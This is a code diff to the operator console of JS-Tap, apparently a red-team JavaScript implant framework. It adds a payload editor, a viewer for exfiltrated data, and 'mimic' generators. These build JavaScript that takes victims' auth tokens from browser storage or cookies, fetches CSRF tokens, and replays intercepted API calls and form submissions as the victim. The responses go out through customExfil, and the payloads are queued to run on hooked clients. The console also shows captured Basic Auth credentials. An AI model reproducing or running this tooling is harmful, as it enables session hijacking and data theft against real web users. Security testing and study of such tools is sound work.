@@ -1,16 +1,52 @@
 let selectedClientId = "";
+let tokenUrl         = "";
+let tokenLocation    = "";
+let tokenKey         = "";
+
+
+// Syntax highlighting code editor
+let codeEditor;
+let codeEditorLoaded = false;
+let codeEditorBig    = false;
+
+function initializeCodeMirror()
+{
+	if (!codeEditorLoaded)
+	{
+		//console.log("Instantiating code editor");
+		var textArea = document.getElementById('payload-editor');
+
+		codeEditor = CodeMirror.fromTextArea(textArea,  {
+			value: "",
+			mode:  "javascript",
+			lineNumbers: false,
+			theme: "default"
+		});
+
+		codeEditorLoaded = true;
+		codeEditor.refresh();
+	}
+}
+
 
 
 
 function escapeHTML(string) 
 {
-    return string
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
+	if (string === undefined || string === null) 
+	{
+		return '';
+	}
+
+	return String(string)
+	.replace(/&/g, "&amp;")
+	.replace(/</g, "&lt;")
+	.replace(/>/g, "&gt;")
+	.replace(/"/g, "&quot;")
+	.replace(/'/g, "&#039;");
 }
+
+
 
 
 function showClientFilterModal()
@@ -115,6 +151,29 @@ function blockClient(imgObject, event, client, nickname)
 
 
 
+function selectAllEvents()
+{
+	var filterModal = document.getElementById('eventFilterModal');
+	var checkboxes  = filterModal.querySelectorAll('input[type="checkbox"]');
+
+	checkboxes.forEach(function(checkbox)
+	{
+		checkbox.checked = true;
+	});
+}
+
+
+function selectNoEvents()
+{
+	var filterModal = document.getElementById('eventFilterModal');
+	var checkboxes  = filterModal.querySelectorAll('input[type="checkbox"]');
+
+	checkboxes.forEach(function(checkbox)
+	{
+		checkbox.checked = false;
+	});
+}
+
 
 function showEventFilterModal()
 {
@@ -160,6 +219,25 @@ function downloadHtmlCode(fileName)
 {
 	window.open(fileName, "_blank");
 }
+
+
+
+async function showExfilViewer(eventKey)
+{
+	exfilData     = await fetch('/api/clientCustomExfilDetail/' + eventKey);
+	exfilDataJson = await exfilData.json();
+
+	var modal = new bootstrap.Modal(document.getElementById('customPayloadExfilModal'));
+
+
+	modalContent = document.getElementById("exfil-data-viewer");
+
+	prettyPrintCode = window.html_beautify(atob(exfilDataJson.data), {indent_size: 2});
+	modalContent.innerHTML = prettyPrintCode;
+	modal.show();
+}
+
+
 
 
 
@@ -369,11 +447,11 @@ async function selectPayload(payload)
 
 	var payloadNameInput   = document.getElementById('payloadName');
 	var payloadDescription = document.getElementById('payloadDescription');
-	var payloadCode        = document.getElementById('payload-editor');
+	// var payloadCode        = document.getElementById('payload-editor');
 
 	payloadNameInput.value   = payload.name;
 	payloadDescription.value = description;
-	payloadCode.value        = code;
+	codeEditor.setValue(code);
 }
 
 
@@ -587,7 +665,7 @@ async function refreshSingleClientPayloadList(client, modal)
 		executePayloadButton.id          = id;
 		executePayloadButton.client      = client;
 		executePayloadButton.className   = 'btn btn-sm me-2';
-		executePayloadButton.textContent = 'Run Payload';
+		executePayloadButton.textContent = 'Run';
 		executePayloadButton.setAttribute('data-toggle', 'tooltip');
 		executePayloadButton.setAttribute('title', 'Run Payload on this Client');
 
@@ -602,7 +680,7 @@ async function refreshSingleClientPayloadList(client, modal)
 		var repeatPayloadToggle         = document.createElement('button');
 		repeatPayloadToggle.id          = id;
 		repeatPayloadToggle.className   = 'btn btn-sm me-2';
-		repeatPayloadToggle.textContent = 'Repeat Payload';
+		repeatPayloadToggle.textContent = 'Repeat';
 		repeatPayloadToggle.name        = name;
 		repeatPayloadToggle.client      = client;
 
@@ -694,7 +772,7 @@ async function refreshSavedPayloadList()
 		var executePayloadButton         = document.createElement('button');
 		executePayloadButton.id          = id;
 		executePayloadButton.className   = 'btn btn-sm me-2';
-		executePayloadButton.textContent = 'Run Payload';
+		executePayloadButton.textContent = 'Run';
 		executePayloadButton.setAttribute('data-toggle', 'tooltip');
 		executePayloadButton.setAttribute('title', 'Run Payload on All Clients Once');
 
@@ -708,7 +786,7 @@ async function refreshSavedPayloadList()
 		var repeatPayloadToggle         = document.createElement('button');
 		repeatPayloadToggle.id          = id;
 		repeatPayloadToggle.className   = 'btn btn-sm me-2';
-		repeatPayloadToggle.textContent = 'Repeat Payload';
+		repeatPayloadToggle.textContent = 'Repeat';
 		repeatPayloadToggle.name        = name;
 
 		repeatPayloadToggle.setAttribute('data-toggle', 'tooltip');
@@ -763,15 +841,59 @@ async function refreshSavedPayloadList()
 
 
 
-async function showCustomPayloadModal()
+function toggleCodeEditor()
+{
+	var codeDiv                 = document.getElementById('payload-editor');
+	var editorCol               = document.getElementById('payloadEditor');
+	var listCol                 = document.getElementById('savedPayloadsList');
+	var listGroup               = document.getElementById('savedPayloadsGroup');
+	var payloadNameGroup        = document.getElementById('payloadNameGroup');
+	var payloadDescriptionGroup = document.getElementById('payloadDescriptionGroup');
+	var toggleCodeButton        = document.getElementById('payload-code-button');
+
+	    // Toggle the editor column to full width and back
+	if (editorCol.classList.contains('col-md-12')) 
+	{
+		this.textContent = "Expand Code";
+		editorCol.classList.remove('col-md-12');
+		editorCol.classList.add('col-md-6');
+		listCol.classList.remove('d-none');
+		listGroup.style.display               = "block";
+		payloadNameGroup.style.display        = "block";
+		payloadDescriptionGroup.style.display = "block";
+		codeEditor.setSize(null, "300px");
+		codeEditor.refresh();
+		codeEditorBig = false;
+	} 
+	else 
+	{
+		this.textContent = "Shrink Code";
+		editorCol.classList.remove('col-md-6');
+		editorCol.classList.add('col-md-12');
+		listCol.classList.add('d-none');
+		listGroup.style.display               = "none";
+		payloadNameGroup.style.display        = "none";
+		payloadDescriptionGroup.style.display = "none";
+		codeEditor.setSize(null, "600px");
+		codeEditor.refresh();
+		codeEditorBig = true;
+	}
+
+	toggleCodeButton.blur();
+}
+
+
+async function showCustomPayloadModal(skipClear)
 {
 	var modal = new bootstrap.Modal(document.getElementById('customPayloadModal'));
 
-	var saveButton      = document.getElementById('payload-save-button');
-	var importButton    = document.getElementById('payload-import-button');
-	var exportButton    = document.getElementById('payload-export-button');
-	var clearJobsButton = document.getElementById('payload-clear-button');
-	var closeButton     = document.getElementById('payload-close-button');
+	var modalElement      = document.getElementById('customPayloadModal');
+	var saveButton        = document.getElementById('payload-save-button');
+	var importButton      = document.getElementById('payload-import-button');
+	var exportButton      = document.getElementById('payload-export-button');
+	var clearJobsButton   = document.getElementById('payload-clear-button');
+	var closeButton       = document.getElementById('payload-close-button');
+	var toggleCodeButton  = document.getElementById('payload-code-button');
 
 
 	var payloadNameInput   = document.getElementById('payloadName');
@@ -780,13 +902,31 @@ async function showCustomPayloadModal()
 
 	var savedPayloadsList = document.getElementById('savedPayloadsList');
 
-	payloadNameInput.value   = "";
-	payloadDescription.value = "";
-	payloadCode.value        = "";
+	initializeCodeMirror();
 
+	if (codeEditorBig)
+	{
+		// Make sure we start with whole UI visible
+		toggleCodeEditor();
+	}
 
-	// Editor toggle stuff
-	var codeEditor = document.getElementById('payloadEditor');
+	if (!skipClear)
+	{
+		// console.log("-----CLEARING CODE");
+		payloadNameInput.value   = "";
+		payloadDescription.value = "";
+		codeEditor.setValue("");
+		codeEditor.refresh();
+	}
+
+	modalElement.addEventListener('shown.bs.modal', function ()
+	{
+	    if (codeEditor) 
+	    {
+	        codeEditor.refresh();
+	    }
+	});
+
 	saveButton.disabled      = false;
 
 
@@ -798,20 +938,23 @@ async function showCustomPayloadModal()
 	payloadNameInput.addEventListener('input', function() 
 	{
 		unsavedChanges = true;
-		console.log("Unsaved changes!");
+		//console.log("Name Unsaved changes!");
 	});
 
 	payloadDescription.addEventListener('input', function() 
 	{
 		unsavedChanges = true;
-		console.log("Unsaved changes!");
+	//	console.log("Description Unsaved changes!");
 	});
 
 
-	payloadCode.addEventListener('input', function() 
+	codeEditor.on("change", function(cm, change) 
 	{
-		unsavedChanges = true;
-		console.log("Unsaved changes!");
+	    if (change.origin === "+input" || change.origin === "paste") 
+	    {
+	        unsavedChanges = true;
+//	        console.log("Human-made change detected in Code Editor.");
+	    } 
 	});
 
 
@@ -842,7 +985,7 @@ async function showCustomPayloadModal()
 	}
 
 
-		// Handle saving modified notes
+	// Handle saving modified notes
 	saveButton.onclick = function(event) 
 	{
 		console.log("Gotta save payload button..");
@@ -857,42 +1000,30 @@ async function showCustomPayloadModal()
 			payloadNameInput.classList.remove('is-invalid');
 			console.log("Payload name is: " + payloadNameInput.value);
 
-			// Ok, now make sure we actually have some code...
-			if (payloadCode.value === "")
-			{
-				console.log("Forget the code?");
-				event.preventDefault();
-				payloadCode.classList.add('is-invalid');
-			}
-			else
-			{
-				payloadCode.classList.remove('is-invalid');
-				console.log("Got code: " + payloadCode.value);
 
-				unsavedChanges = false;
+			unsavedChanges = false;
 
-				// send payload to server
-				fetch('/api/savePayload', {
-					method:"POST",
-					body: JSON.stringify({
-						name: payloadNameInput.value,
-						description: btoa(payloadDescription.value),
-						code: btoa(payloadCode.value)
-					}),
-					headers: {
-						"Content-type": "application/json; charset=UTF-8"
-					}
-				})
-				.then(response => {
-					if (!response.ok) {
-						console.log('Save payload server failed.');
-					}
-					return response.text();
-				})
-				.then(text => {
-					refreshSavedPayloadList();
-				});	
-			}
+			// send payload to server
+			fetch('/api/savePayload', {
+				method:"POST",
+				body: JSON.stringify({
+					name: payloadNameInput.value,
+					description: btoa(payloadDescription.value),
+					code: btoa(codeEditor.getValue())
+				}),
+				headers: {
+					"Content-type": "application/json; charset=UTF-8"
+				}
+			})
+			.then(response => {
+				if (!response.ok) {
+					console.log('Save payload server failed.');
+				}
+				return response.text();
+			})
+			.then(text => {
+				refreshSavedPayloadList();
+			});	
 		}
 		saveButton.blur();
 	}
@@ -907,15 +1038,20 @@ async function showCustomPayloadModal()
 		{
 			console.log("Clearing all jobs!");
 			fetch('/api/clearAllPayloadJobs')
-				.then(response => {
-					refreshSavedPayloadList();
-				});
+			.then(response => {
+				refreshSavedPayloadList();
+			});
 		}
 
 		clearJobsButton.blur();
 	}
 
 
+
+	toggleCodeButton.onclick = function(event)
+	{
+		toggleCodeEditor();
+	}	
 
 	var importInput = document.getElementById('importInput');
 	importInput.removeEventListener('change', importPayloads);
@@ -934,6 +1070,7 @@ async function showCustomPayloadModal()
 	}
 
 	modal.show();
+	codeEditor.refresh();	
 }
 
 
@@ -1001,6 +1138,7 @@ function showNoteEditor(event, client, nickname, notes)
 
 
 
+
 async function showReqRespViewer(eventKey, type)
 {
 	if (type == "XHR")
@@ -1027,9 +1165,6 @@ async function showReqRespViewer(eventKey, type)
 	prettyRequest  = window.js_beautify(atob(requestBody), {indent_size: 2});
 	prettyResponse = window.js_beautify(atob(responseBody), {indent_size: 2});
 
-	// console.log("!!!! Request: " + prettyRequest);
-	// console.log("!!!! Response: " + prettyResponse);
-
 	requestContent = document.getElementById("requestBox");
 	requestContent.innerHTML = prettyRequest;
 
@@ -1041,6 +1176,608 @@ async function showReqRespViewer(eventKey, type)
 	var modal = new bootstrap.Modal(document.getElementById('requestResponseModal'));
 	modal.show();
 }
+
+
+
+async function searchCSRFToken(eventKey, tokenName, tokenValue)
+{
+	var searchDataDiv = document.getElementById('searchDataDiv');
+
+	searchDataDiv.innerHTML = "";
+
+	tokenSearchReq = await fetch('/api/formCsrfTokenSearch/' + eventKey, {
+		method:"POST",
+		body: JSON.stringify({
+			tokenName: tokenName,
+			tokenValue: tokenValue
+		}),
+		headers: {
+			"Content-type": "application/json; charset=UTF-8"
+		}
+	});
+
+	tokenSearchJson = await tokenSearchReq.json();
+
+	var searchData = document.createElement('p');
+
+	searchData.innerHTML  = '<b>CSRF Token URL:</b><br>' + tokenSearchJson.url + '<br><br>';
+	searchData.innerHTML += '<b>CSRF Token file:</b><br>' + tokenSearchJson.fileName + '<br><br>';
+	searchData.innerHTML += '<button type="button" class="btn btn-primary" onclick=downloadHtmlCode(' + `'` + tokenSearchJson.fileName + `'`+ ')>Download Code</button><br><br>';
+	searchData.innerHTML += '<b>Click "Next" to build payload</b>';
+	tokenUrl = tokenSearchJson.url;
+	searchDataDiv.appendChild(searchData);
+}
+
+
+
+
+async function searchAuthToken(eventKey, tokenValue, apiType)
+{
+	var searchDataDiv = document.getElementById('apiSearchDataDiv');
+
+	searchDataDiv.innerHTML = "";
+
+
+	tokenSearchReq = await fetch('/api/apiAuthTokenSearch/' + eventKey, {
+		method:"POST",
+		body: JSON.stringify({
+			type:apiType,
+			tokenValue: tokenValue
+		}),
+		headers: {
+			"Content-type": "application/json; charset=UTF-8"
+		}
+	});
+
+	tokenSearchJson = await tokenSearchReq.json();
+
+	var searchData = document.createElement('p');
+
+	if (tokenSearchJson.location === "NOT FOUND")
+	{
+		searchData.innerHTML  = '<b>Auth Token not found in cookies or local or session storage. </br><br><br>';
+		searchData.innerHTML += '<b>Check API Call Body for authorization token. </br><br><br>';
+	}
+	else
+	{
+		searchData.innerHTML  = '<b>Auth Token Location:</b><br>' + tokenSearchJson.location + '<br><br>';
+		searchData.innerHTML += '<b>Token Key:</b><br>' + tokenSearchJson.tokenName + '<br><br>';
+		searchData.innerHTML += '<b>Click "Next" to build payload</b>';		
+	}
+
+
+	tokenLocation = tokenSearchJson.location;
+	tokenKey      = tokenSearchJson.tokenName;
+	searchDataDiv.appendChild(searchData);
+}
+
+
+
+
+
+async function showMimicApiModal(eventKey, apiCallDataString, apiType)
+{
+	initializeCodeMirror();
+	console.log("Showing mimic api call modal with key: " + eventKey);
+
+	var searchButton  = document.getElementById("mimic-api-search-button");
+	var nextButton    = document.getElementById("mimic-api-next-button");
+	var tokenName     = document.getElementById("apiTokenNameInput");
+	var tokenValue    = document.getElementById("apiTokenValueInput");
+
+	tokenName.value  = "";
+	tokenValue.value = "";
+
+	var tokenSearch = false;
+
+	var apiCallData = JSON.parse(apiCallDataString);
+
+	console.log(apiCallData);
+
+	var apiURL    = escapeHTML(apiCallData.url);
+	var apiMethod = escapeHTML(apiCallData.method);
+	var apiSync   = true;
+	var name      = "";
+	var password  = "";
+
+	if (apiType === "XHR")
+	{
+		apiAsync = escapeHTML(apiCallData.asyncRequest);
+		name     = escapeHTML(apiCallData.name);
+		passwrod = escapeHTML(apiCallData.password);
+	}
+
+	var apiDataDiv    = document.getElementById('apiDataDiv');
+	var searchDataDiv = document.getElementById('apiSearchDataDiv');
+
+	apiDataDiv.innerHTML = "";
+
+	var data = document.createElement('p');
+	data.innerHTML  = 'API Type: <b>' + apiType + '</b><br>';
+	data.innerHTML += 'URL: <b>' + apiURL + '</b><br>';
+	data.innerHTML += 'Method: <b>' + apiMethod + '</b><br>';
+	data.innerHTML += '<br>';
+	data.innerHTML += 'Headers:<br>';
+
+
+	// headers...
+	apiCallData.headers.forEach(header => {
+		data.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
+		data.innerHTML += "<br>";
+	});
+
+	// Show body option?
+
+    // Append the paragraph to the dynamic div
+	apiDataDiv.appendChild(data);
+
+	searchDataDiv.innerHTML = "";
+
+
+	// Need to get the request body
+	if (apiType == "XHR")
+	{
+		xhrCallReq  = await fetch('/api/clientXhrCall/' + eventKey);
+		xhrCallJson = await xhrCallReq.json();
+
+		requestBody  = xhrCallJson.requestBody;
+		responseBody = xhrCallJson.responseBody;
+	}
+	else if (apiType == "FETCH")
+	{
+		fetchCallReq  = await fetch('/api/clientFetchCall/' + eventKey);
+		fetchCallJson = await fetchCallReq.json();
+
+		requestBody  = fetchCallJson.requestBody;
+		responseBody = fetchCallJson.responseBody;
+	}
+	else
+	{
+		console.log("Invalid api type in showMimicApiModal()");
+	}
+
+	console.log("In mimic API, request body is: " + atob(requestBody));
+
+
+
+	searchButton.onclick = function(event) 
+	{
+		var canSearch = true;
+
+		if (tokenName.value.trim() === "")
+		{
+			tokenName.classList.add('is-invalid');
+			canSearch = false;
+		}
+		else
+		{
+			tokenName.classList.remove('is-invalid');
+		}
+
+		if (tokenValue.value.trim() === "")
+		{
+			tokenValue.classList.add('is-invalid');
+			canSearch = false;
+		}
+		else
+		{
+			tokenValue.classList.remove('is-invalid');
+		}
+
+		if (canSearch)
+		{
+			searchAuthToken(eventKey, tokenValue.value.trim(), apiType)
+			tokenSearch = true;
+		}
+
+		searchButton.blur();
+	}
+
+
+    // Generate a mimic payload
+	nextButton.onclick = function(event)
+	{
+    	// Let's generate that payload
+		var payload = "";
+
+		payload += "// JS-Tap mimic generated API call payload\n";
+		payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
+		payload += "// ----------------------------------------------------------------------.\n";
+
+
+		//  I need to body from the API call here...
+		requestBodyJson = JSON.parse(atob(requestBody));
+
+		for (let key in requestBodyJson)
+		{
+			if (requestBodyJson.hasOwnProperty(key))
+			{
+				console.log("key: " + key + ", value: " + requestBodyJson[key]);
+				payload += `var var_${key} = '${requestBodyJson[key]}';\n`;
+			}
+		}
+
+		payload += "// ----------------------------------------------------------------------.\n";
+
+		switch(tokenLocation)
+		{
+		case 'Local Storage':
+			{
+				payload += `var foundAuthToken = localStorage.getItem('${tokenKey}');\n`;
+			}
+			break;
+
+		case 'Session Storage':
+			{
+				payload += `var foundAuthToken = sessionStorage.getItem('${tokenKey}');\n`;
+			}
+			break;
+
+		case 'Cookies':
+			{
+				payload += `var foundAuthToken = getCookie('${tokenKey}');\n`;
+			}
+			break;
+
+		default:
+			if (tokenSearch)
+			{
+				// Only matters if we're trying to search for a token
+				alert('Authentication token not found.');
+			}
+		}
+
+
+		payload += "var bodyData = {\n";
+
+		for (let key in requestBodyJson)
+		{
+			if (requestBodyJson.hasOwnProperty(key)) 
+	  		{  // Check if the key is not from the prototype chain
+	  			var variableName = key.replace(/-/g, '_');
+	  			payload += `	"${key}": var_${variableName},\n`;
+	  		}		
+	  	}
+	  	payload += "};\n";
+
+
+	  	payload += `fetch('${apiURL}', {\n`;
+	  	payload += `	method: '${apiMethod}',\n`;
+	  	payload += `	credentials: 'same-origin',\n`;
+	  	payload += '    headers: {\n';
+
+		// Pull the headers in:
+	  	for (let key in apiCallData.headers) 
+	  	{
+	  		if (apiCallData.headers.hasOwnProperty(key)) 
+	  		{
+		        var headerInfo = apiCallData.headers[key]; // Assuming this is already an object with 'header' and 'value'
+
+		        var headerName  = headerInfo.header;
+		        var headerValue = headerInfo.value;
+
+		        console.log('$$$$$ Header Info: ', headerInfo);
+		        console.log('## Name: ' + headerName + ', Value: ' + headerValue);
+
+		        // Check if the key is the auth token
+		        if (headerName === tokenName.value.trim()) 
+		        {
+		            // this is our dynamic token
+		        	console.log('&& found auth header!');
+
+		            // Need to check if it uses the Bearer format
+		        	if (headerValue.includes('Bearer'))
+		        	{
+		        		payload += `        '${headerName}': 'Bearer ' + foundAuthToken,\n`;
+
+		        	}
+		        	else
+		        	{		          
+		        		payload += `        '${headerName}': foundAuthToken,\n`;
+		        	}
+		        } 
+		        else 
+		        {
+		        	console.log('** handling non-auth header...');
+		        	payload += `        '${headerName}': '${headerValue}',\n`;
+		        }
+		    }
+		}
+		payload += '    },\n';
+
+		payload += '	body: JSON.stringify(bodyData)\n';
+
+		payload += "})\n";
+		payload += ".then(response => {\n";
+		payload += "	var statusCode = response.status;\n";
+		payload += "	return response.text().then(responseBody => {\n";
+		payload += "		customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
+		payload += "	});\n";
+		payload += "})\n";
+		payload += ".catch(error => {\n";
+		payload += "	customExfil('Error', 'Caught error in mimic payload');\n";
+		payload += "})\n";
+
+
+		nextButton.blur();
+		console.log("Payload dump:");
+		console.log(payload);
+
+
+    	// Ok, now we need to push this into the C2 system
+		var payloadNameInput   = document.getElementById('payloadName');
+		var payloadDescription = document.getElementById('payloadDescription');
+		//var payloadCode        = document.getElementById('payload-editor');
+
+		payloadNameInput.value   = "Mimic API payload";
+		payloadDescription.value = "Automatically generated custom payload from intercepted API network calls.";
+		//payloadCode.value        = payload;
+		codeEditor.setValue(payload);
+
+		modal.hide();
+		showCustomPayloadModal(true);
+	}
+
+	// Pop that sucker open
+	var modal = new bootstrap.Modal(document.getElementById('createApiMimicModal'));
+	modal.show();
+}
+
+
+
+
+async function showMimicFormModal(eventKey, formDataString)
+{
+	initializeCodeMirror();
+	// createFormMimicModal
+	console.log("Showing mimic form modal with key: " + eventKey);
+
+	var searchButton = document.getElementById("mimic-form-search-button");
+	var nextButton   = document.getElementById("mimic-form-next-button");
+	var csrfName     = document.getElementById("csrfNameInput");
+	var csrfValue    = document.getElementById("csrfValueInput");
+
+	csrfName.value  = "";
+	csrfValue.value = "";
+
+	var formData = JSON.parse(formDataString);
+
+	var formName    = escapeHTML(formData.name);
+	var formContent = escapeHTML(atob(formData.data));
+	var formAction  = escapeHTML(atob(formData.action))
+	var formMethod  = escapeHTML(formData.method);
+	var formEncType = escapeHTML(formData.encType);
+	var formURL     = escapeHTML(formData.url);
+
+	var formDataDiv   = document.getElementById('formDataDiv');
+	var searchDataDiv = document.getElementById('searchDataDiv');
+
+	formDataDiv.innerHTML = "";
+
+	var data = document.createElement('p');
+	data.innerHTML  = 'Form URL: <b>' + formURL + '</b><br>';
+	data.innerHTML += 'Form Name: <b>' + formName + '</b><br>';
+	data.innerHTML += 'Action: <b>' + formAction + '</b><br>';
+	data.innerHTML += 'Method: <b>' + formMethod + '</b><br>';
+	data.innerHTML += 'Encoding Type: <b>' + formEncType + '</b><br><br>';
+
+	data.innerHTML += 'Content:' + '<br>';
+
+	var formattedContent = formContent.replace(/\n/g, '<br>');
+
+	formattedContent = formattedContent.replace(/^<br>/, '');
+	data.innerHTML  += formattedContent;
+
+    // Append the paragraph to the dynamic div
+	formDataDiv.appendChild(data);
+
+	searchDataDiv.innerHTML = "";
+
+	searchButton.onclick = function(event) 
+	{
+		var canSearch = true;
+
+		if (csrfName.value.trim() === "")
+		{
+			csrfName.classList.add('is-invalid');
+			canSearch = false;
+		}
+		else
+		{
+			csrfName.classList.remove('is-invalid');
+		}
+
+		if (csrfValue.value.trim() === "")
+		{
+			csrfValue.classList.add('is-invalid');
+			canSearch = false;
+		}
+		else
+		{
+			csrfValue.classList.remove('is-invalid');
+		}
+
+		if (canSearch)
+		{
+			searchCSRFToken(eventKey, csrfName.value.trim(), csrfValue.value.trim())
+		}
+
+		searchButton.blur();
+	}
+
+    // Prep our form parameters/values
+	var lines = formContent.trim().split('\n');
+
+	var parsedForm = lines.map(line => {
+		var parts = line.trim().split(':');
+		return {
+			key: parts[0].trim(),
+			value: parts[1].trim()
+		};
+	});
+
+    // console.log("--Parsed form: ");
+    // console.log(parsedForm);
+
+
+    // Generate a mimic payload
+	nextButton.onclick = function(event)
+	{
+    	// Let's generate that payload
+		var payload = "";
+
+		payload += "// JS-Tap mimic generated form submission payload\n";
+		payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
+		payload += "// ----------------------------------------------------------------------.\n";
+
+		parsedForm.forEach(item => {
+			var variableName = item.key.replace(/-/g, '_');
+
+    		// Skip the CSRF variable, we'll handle that later automatically
+			if (item.key.trim() === csrfName.value.trim())
+			{
+				return;
+			}
+
+			payload += `var var_${variableName} = '${item.value}';\n`;
+		});
+		payload += "// ----------------------------------------------------------------------.\n";
+
+	    // Default type on null
+		if (formEncType === null || formEncType === undefined || formEncType === '' || formEncType === 'null')
+		{
+			formEncType = "'application/x-www-form-urlencoded'";
+		}
+
+		// Defaults to current page if null, so the page with the CSRF token
+		if (formAction === null || formAction === undefined || formAction === '' || formAction === 'null')
+		{
+			formAction = formURL;
+		}
+
+		payload += "\n\n";
+
+		var haveCSRF = false;
+
+		if (searchDataDiv.innerHTML != "")
+		{
+			haveCSRF = true;
+		}
+
+    	// Check if we have a CSRF token to deal with
+		if (haveCSRF)
+		{
+    		// There is a CSRF token to contend with
+			console.log("** Generating payload with a CSRF token...");
+			payload += "// Get the CSRF token first\n";
+			payload += "fetch('" + tokenUrl + "')\n";
+			payload += "	.then(response =>{\n";
+			payload += "		if(!response.ok){\n";
+			payload += "			customExfil('Error', 'Error fetching CSRF Token with Mimic payload');\n";
+			payload += "            throw new Error('Error fetching CSRF Token with Mimic payload');\n";
+			payload += "		}\n";
+			payload += "		return response.text();\n";
+			payload += "	})\n";
+			payload += "	.then(text => {\n";
+			payload += "		var fetchedContent = text;\n";
+			payload += "		var parser         = new DOMParser();\n";
+			payload += "		var parsedDoc      = parser.parseFromString(fetchedContent, 'text/html');\n";
+			payload += `		var tokenInput     = parsedDoc.querySelector('input[name="` + csrfName.value + `"]');\n`;
+			payload += "		\n";
+			payload += "		return tokenInput ? tokenInput.value : null;\n";
+			payload += "	})\n";
+			payload += "	.then(csrfToken => {\n";
+			payload += "		if (!csrfToken) {\n";
+			payload += "			customExfil('Error', 'Error using CSRF Token in mimic payload');\n";
+			payload += "            throw new Error('Error using CSRF Token in Mimic payload');\n";
+			payload += "		}\n\n";
+		}
+		
+		payload += "		var bodyData = {\n";
+
+		parsedForm.forEach((item, index, array) => {
+			var variableName = item.key.replace(/-/g, '_');
+
+			// Skip the CSRF variable, we'll handle that after the loop
+			if (item.key.trim() === csrfName.value.trim())
+			{
+				return;
+			}
+
+			payload += `			"${item.key}": var_${variableName},\n`;
+		});
+		if (haveCSRF)
+		{
+			payload += `			"${csrfName.value.trim()}": csrfToken\n`;
+		}
+		payload += "		};\n";
+
+		payload += "		// Final request is below:\n";
+		payload += "		fetch('" + formAction + "', {\n";
+		payload += `			method: '${formMethod}',\n`;
+		payload += "			headers: {\n";
+		payload += `				'Content-Type': ${formEncType},\n`;
+		payload += "			},\n";
+
+		// console.log("$$$$$ encType: " + formEncType);
+		if (formEncType == "'application/x-www-form-urlencoded'")
+		{
+
+			payload += "			body: Object.keys(bodyData).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(bodyData[key])).join('&')\n";
+		}
+		else if (formEncType == "'application/json'")
+		{
+			payload += "			body: JSON.stringify(bodyData)\n";
+		}
+		else
+		{
+			console.log("*** Error, this encoding type not handled yet");
+			alert('Error in mimic generator, unhandled form encoding type:\n' + formEncType);
+		}
+
+		payload += "		})\n";
+		payload += "		.then(response => {\n";
+		payload += "			var statusCode   = response.status;\n";
+		payload += "			return response.text().then(responseBody => {\n";
+		payload += "				customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
+		payload += "			});\n";
+		payload += "		})\n";
+		payload += "        .catch(error => {\n";
+		payload += "			customExfil('Error', 'Caught error in mimic payload');\n";
+		payload += "		})\n";
+
+		if (haveCSRF)
+		{
+			payload += "	});\n";
+		}
+
+
+		console.log("Generated payload:");
+		console.log(payload);
+
+		nextButton.blur();
+
+    	// Ok, now we need to push this into the C2 system
+		var payloadNameInput   = document.getElementById('payloadName');
+		var payloadDescription = document.getElementById('payloadDescription');
+		//var payloadCode        = document.getElementById('payload-editor');
+
+		payloadNameInput.value   = "Mimic Form submission payload";
+		payloadDescription.value = "Automatically generated custom payload from form submission.";
+		//payloadCode.value        = payload;
+		codeEditor.setValue(payload);
+
+		modal.hide();
+		showCustomPayloadModal(true);
+	}
+
+	var modal = new bootstrap.Modal(document.getElementById('createFormMimicModal'));
+	modal.show();
+}
+
+
+
+
 
 function showAboutModal()
 {
@@ -1208,83 +1945,85 @@ async function getClientDetails(id)
   	break;
 
 
-  case 'XHROPEN':
+  case 'XHRAPICALL':
   	if (document.getElementById('apiEvents').checked == true)
   	{
   		activeEvent = true;
-  		xhrOpenReq  = await fetch('/api/clientXhrOpen/' + eventKey);
-  		xhrOpenJson = await xhrOpenReq.json();
+  		xhrApiCallReq  = await fetch('/api/clientXhrApiCall/' + eventKey);
+  		xhrApiCallJson = await xhrApiCallReq.json();
 
-  		cardTitle.innerHTML = "API - XHR Open";
-  		cardText.innerHTML  = "URL: <b>" + xhrOpenJson.url + "</b>";
+
+  		cardTitle.innerHTML = "Network - XHR API Call";
+
+  		// Show basics
+  		cardText.innerHTML  = "URL: <b>" + xhrApiCallJson.url + "</b>";
   		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Method: <b>" + xhrOpenJson.method + "</b>";
-  	}
-  	break;
-
-  case 'XHRSETHEADER':
-  	if (document.getElementById('apiEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		xhrHeaderReq  = await fetch('/api/clientXhrSetHeader/' + eventKey);
-  		xhrHeaderJson = await xhrHeaderReq.json();
-
-  		cardTitle.innerHTML = "API - XHR Set Header";
-  		cardText.innerHTML  = "Header: <b>" + xhrHeaderJson.header + "</b>";
+  		cardText.innerHTML += "Method: <b>" + xhrApiCallJson.method + "</b>";
   		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Value: <b>" + xhrHeaderJson.value + "</b>";
-  	}
-  	break;
+  		cardText.innerHTML += "Basic Auth: <b>" + xhrApiCallJson.user + ':' + xhrApiCallJson.password + "</b>";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Headers:";
+  		cardText.innerHTML += "<br>";
 
-  case 'XHRCALL':
-  	if (document.getElementById('apiEvents').checked == true)
-  	{
-  		activeEvent = true;
+  		xhrApiCallJson.headers.forEach(header => {
+  			cardText.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
+  			cardText.innerHTML += "<br>";
+  		});
 
-  		cardTitle.innerHTML = "API - XHR Call";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Response Status: <b>" + xhrApiCallJson.responseStatus + "</b>";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "<br>";
+
   		cardText.innerHTML += '<br><button type="button" class="btn btn-primary" onclick=showReqRespViewer(' 
   		+ eventKey + ',"XHR")>View API Call</button>';
+
+  		jsonDataString = JSON.stringify(xhrApiCallJson).replace(/"/g, '&quot;');
